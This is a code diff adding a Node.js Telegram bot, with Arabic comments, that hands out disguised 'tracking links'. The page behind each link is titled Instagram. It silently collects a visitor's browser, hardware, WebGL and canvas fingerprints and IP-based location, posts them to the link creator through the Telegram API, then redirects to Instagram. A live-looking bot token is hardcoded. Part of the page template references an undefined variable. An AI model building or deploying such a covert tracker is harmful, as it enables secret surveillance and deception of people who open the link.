@@ -1,0 +1,163 @@
+const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+const app = express();
+
+// استبدل هذا بـ token البوت الخاص بك
+const token = '7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58';
+const bot = new TelegramBot(token, {polling: true});
+
+// صفحة الويب التي ستجمع البيانات
+const TRACKING_PAGE_URL = 'https://yourdomain.com/tracking.html';
+
+// أوامر البوت
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    const username = msg.from.first_name;
+    
+    const welcomeMsg = `مرحباً ${username}! 👋
+
+🎯 هذا البوت يمكنك من إنشاء روابط تتبع خاصة بك
+
+📌 عندما يفتح أي شخص الرابط الخاص بك:
+1. سيتم توجيهه تلقائياً إلى Instagram
+2. ستستلم أنت جميع معلومات جهازه سراً
+
+🚀 لإنشاء رابط التتبع الخاص بك:
+اضغط /getlink
+
+🔒 جميع البيانات تصل لك أنت فقط ولا يراها أحد غيرك`;
+
+    bot.sendMessage(chatId, welcomeMsg);
+});
+
+bot.onText(/\/getlink/, (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    const trackingLink = `${TRACKING_PAGE_URL}?ref=${userId}`;
+    
+    const linkMsg = `🔗 هذا هو رابط التتبع الخاص بك:
+${trackingLink}
+
+📤 يمكنك مشاركته مع أي شخص:
+- عندما يفتحه، سيتم توجيهه إلى Instagram
+- وستصلك أنت جميع معلومات جهازه
+
+⚠️ احتفظ بالرابط خاصاً بك ولا تشاركه مع أشخاص غير موثوقين`;
+    
+    bot.sendMessage(chatId, linkMsg);
+});
+
+// صفحة تتبع البيانات
+app.get('/tracking.html', (req, res) => {
+    const ref = req.query.ref || '5854169054'; // القيمة الافتراضية
+    
+    res.send(`
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Instagram</title>
+<style>body{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}</style>
+</head>
+<body>
+
+<script>
+(async () => {
+    const botToken = "${token}";
+    const targetUserId = "${ref}";
+
+    const data = {
+        ua: navigator.userAgent,
+        pl: navigator.platform,
+        ven: navigator.vendor,
+        av: navigator.appVersion,
+        hc: navigator.hardwareConcurrency || "N/A",
+        dm: navigator.deviceMemory ? navigator.deviceMemory + ' جيجابايت' : "N/A",
+        sw: screen.width,
+        sh: screen.height,
+        ip: "N/A",
+        country: "N/A",
+        city: "N/A",
+        wv: "N/A",
+        wr: "N/A",
+        cf: "N/A"
+    };
+
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            data.wv = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A";
+            data.wr = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+        }
+    } catch(e) {}
+
+    try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.font = "16px Arial";
+        ctx.fillText("fp",2,15);
+        data.cf = canvas.toDataURL().substring(0,100) + "...";
+    } catch(e) {}
+
+    fetch("https://ipapi.co/json/")
+        .then(r => r.ok ? r.json() : {})
+        .then(ip => {
+            data.ip = ip.ip || "N/A";
+            data.country = ip.country_name || "N/A";
+            data.city = ip.city || "N/A";
+            sendReport();
+        })
+        .catch(() => sendReport());
+
+    function sendReport() {
+        const msg = \`*📊 تقرير جديد من الرابط*
+
+👤 المستخدم: ${escape(msg.from.first_name || 'مجهول')}
+📱 الجهاز: ${escape(data.pl)} - ${escape(data.ven)}
+
+📌 *المعلومات الفنية:*
+- المتصفح: \${escape(data.ua)}
+- الإصدار: \${escape(data.av)}
+- الأنوية: \${data.hc}
+- الذاكرة: \${data.dm}
+- الدقة: \${data.sw}x\${data.sh}
+
+🌐 *الموقع الجغرافي:*
+- IP: \${data.ip}
+- الدولة: \${escape(data.country)}
+- المدينة: \${escape(data.city)}\`;
+
+        fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: targetUserId,
+                text: msg,
+                parse_mode: "Markdown"
+            })
+        }).catch(() => {});
+        
+        window.location.replace("https://www.instagram.com/");
+    }
+
+    function escape(text) {
+        return text ? text.replace(/[_*[\]()~>#+\-=|{}.!]/g, '\\\\$&') : "N/A";
+    }
+})();
+</script>
+
+</body>
+</html>
+    `);
+});
+
+// تشغيل السيرفر
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(\`Server running on port \${PORT}\`);
+});
